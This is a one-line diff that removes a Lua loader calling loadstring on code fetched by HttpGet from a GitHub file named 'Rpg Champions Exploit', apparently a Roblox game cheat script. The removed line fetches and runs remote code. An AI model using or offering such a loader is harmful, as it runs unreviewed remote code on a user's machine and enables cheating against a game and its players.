@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TrickyAH/Scripts/main/Rpg%20Champions%20Exploit"))()
